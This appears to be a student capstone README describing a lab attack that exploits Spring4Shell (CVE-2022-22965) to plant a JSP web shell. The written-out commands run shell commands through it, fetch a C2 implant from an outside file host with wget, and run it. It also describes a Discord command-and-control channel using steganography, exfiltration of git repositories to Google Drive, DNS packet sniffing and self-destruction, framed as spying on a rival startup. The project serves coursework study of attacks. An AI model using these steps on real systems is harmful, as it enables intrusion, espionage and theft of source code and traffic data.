# 590J Captsone Project
Group: **Counting Sheep**

Brendan Henrich

Andrew Maldonado

Basundhara Chakrabarty

**Scenario: 
To get ahead in the competitive startup environment, startup A wishes to try and figure out what startup B is working on.

**Vulnerability:**

+We exploit the very recent Spring4Shell vulnerability (CVE-2022-22965) in the JAVA Spring framework,a very commonly used enterprise-grade development framework among developers. (Ref: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965)
Spring4Shell allows us to execute remote code on the target code, attackers can send crafted HTTP requests to create a malicious .jsp file in the service’s root directory.

Requirements for a host to be vulnerable to Spring4Shell:
JDK (Java Development Kit) 9++
spring-webmvc or spring-webflux
Spring framework versions 5.2.0 to 5.2.19, 5.3.0 to 5.3.17, or older
Apache Tomcat to serve the application
Built as a WAR (Web Application Resource) file (and not JAR)


**Spring4shell Implant Delivery**

CVE-2022-22965

## Proof of Concept Setup
2x Virtual Machines [Host OS Windows 10] running Ubuntu 20.04.4 LTS
Local network DCHP 10.0.2.0/24

Attacker IP = 10.0.2.15

Target IP = 10.0.2.4

Target is running vulnerable Spring server !

**Instructions:**
```
Start here: https://medium.com/geekculture/spring4shell-exploit-walkthrough-9843c0244b68
On Target: [run the vulnerable spring server]
cd spring4shell
sudo docker run -p 80:8080 spring4shell
```
On Attacker: [launch the attack]:
```
cd spring4shell
python3 exploit.py --url 'http://10.0.2.4/helloworld/greeting'
```

**WEB SHELL COMMANDS:**
```
lynx -dump http://10.0.2.4/shell.jsp?cmd=whoami
lynx -dump http://10.0.2.4/shell.jsp?cmd=echo%20spring4shell
lynx -dump http://10.0.2.4/shell.jsp?cmd=ls
lynx -dump http://10.0.2.4/shell.jsp?cmd=ls%20-l%20/
```

**LOAD the implant:**
```
lynx -dump http://10.0.2.4/shell.jsp?cmd=wget%20-q%20https://get.station307.com/XGHo3dJDb31/c2_implant
lynx -dump http://10.0.2.4/shell.jsp?cmd=wget%20-q%20https://get.station307.com/nScoTrBugqc/secrets.json
```

** RUN the implant:**
lynx -dump http://10.0.2.4/shell.jsp?cmd=%2e%2fc2_implant

Anatomy of our exploit:
![GitHub Logo](/Anatomy.png)

How do we get access to the target?
By exploiting the recent vulnerability Spring4Shell (CVE-2022-22965)!

  
**How does our Command and Control Server work?**
+Python code c2_home.py to enable a Discord server that waits until the bot (implant) is online and then sends commands to it! The commands are sent embedded to images using python stegano.

**How does our Implant work?**

+The implant is written in python, and compiled into a binary executable for Ubuntu 20.04 LTS AMD64, and can be placed in the startup folder or run from the webshell
+Logically it can be compiled for for a host that is vulnerable to Spring4any architecture Shell!

Implant code: Main code is c2_implant.py, which calls c2_discord.py(aiding in Discord communication) and helper.py (Performs the Data exfiltration)
The implant code polls Discord every <Poll time interval> (set to 5s at the beginning of the presentation) to fetch messages (in the form of images, fetch_command() function in c2_implsnt.py) from the CnC server, and once it gets an image, decrypts it into a message and executes it. We used the stegano python library for embedding messages in the images. There are four possible messages, as seen in the parse_command() function in c2_implant.py:
  
+sleep <NEW_TIMER>: Change sleep timer to NEW_TIMER, useful if we need the bot to poll less frequently and lay low for a while
  
+repos: Launch get_git_repos() (described below)
  
+sniff 1 and sniff 0: Toggles the sniffer function sniff() described below
  
+sd: Self destruct, remove all files on disk and exit, this logic is present in the self_destruct() function
  

**What data do we exfiltrate?**
Our implant can collect two types of data: Git Repos from the target (since every developement team uses version control), and we can also launch a packet sniffer. 

+Currently, helper.py has get_git_repos(), which scans the local filesystem for git repos, tar-s them in a temporary directory in /tmp, uploads the tar-ed files to a service account on Google Drive, and then deletes the files and the temporary folder. We use Google Drive APIs to connect to the service account

+Additionally, the sniff() function takes in an integer toggle (1: on and 0: off), sniff(1) starts packet sniffing on available interfaces (Using python scapy) and collects all DNS (TCP and UDP port 53) packets. Sniff(0) turns off sniffing, and if any packets are collected, they are uploaded to Drive by calling uploadToDrive(). These packets can be downloaded from Google Drive and viewed in Wireshark, they contain the domain names in plaintext!
  
**How do we obfuscate the data/hide in plain sight?**
+We use steganography to send commands from CnC to target, and can change the poll times or self destruct (remove itself completely from target)
+Everything that the implant generates is saved in /tmp and removed after upload

**How can we possibly scale our project?**
+Our CnC server can send commands to multiple bots, possible next step would be to add functionality to add multiple bots in the code, use a sequencing mechanism to route commands to various bots by group, and have them execute them.
+We can collect a bunch of packet captures showing unencrypted DNS packets, collect the domain names from them and run analytics to get more info on the internet activity of the developer, eg., what websites does she visits, what developer console tools she uses, etc etc. 


